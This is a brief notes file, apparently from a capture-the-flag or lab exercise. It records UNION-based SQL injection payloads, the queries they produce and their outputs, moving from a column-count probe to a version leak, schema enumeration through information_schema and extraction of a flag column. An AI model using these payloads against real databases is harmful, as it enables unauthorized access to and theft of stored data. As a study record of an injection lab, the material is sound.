
query_1 = "    SELECT * FROM dummy_data WHERE id='*il tuo input*'    "
payload_1 = "   1' union select 1,2,3,4,5,'6    " 
#funziona finchè le colonne sono le stesse

payload_2 = "   1' union select 1,version(),3,4,5,'6   "
query_2 = "  SELECT * FROM dummy_data WHERE id='1' union select 1,version(),3,4,5,'6'  "

output = """ 1, 9.3.0, 3, 4, 5, 6
             1, dummy value1, 3, another_value1, lollo, 4
            """

payload_3 = "   1' union select 1,2,3,4,table_name, column_name from information_schema.columns WHERE table_schema=DATABASE() --    "
query_3 = " SELECT * FROM dummy_data WHERE id='1' union select 1,2,3,4,table_name, column_name from information_schema.columns WHERE table_schema=DATABASE() -- '  "

output = """ 
            1, 2, 3, 4, real_data, id
            1, 2, 3, 4, real_data, flag
            1, 2, 3, 4, dummy_data, idk_what_im_doing
            1, 2, 3, 4, dummy_data, id
            1, 2, 3, 4, dummy_data, foobar
            1, 2, 3, 4, dummy_data, dummy_int
            1, 2, 3, 4, dummy_data, dummy_column
            1, 2, 3, 4, dummy_data, another_column
            1, dummy value1, 3, another_value1, lollo, 4
         """

payload_3 = "     1' UNION SELECT 1,2,3,4,5,flag FROM real_data WHERE id='1     "
query_3 = " SELECT * FROM dummy_data WHERE id='1' UNION SELECT 1,2,3,4,5,flag FROM real_data WHERE id='1'  "

output = """ 
            11, 2, 3, 4, 5, flag{...}
            1, dummy value1, 3, another_value1, lollo, 4
         """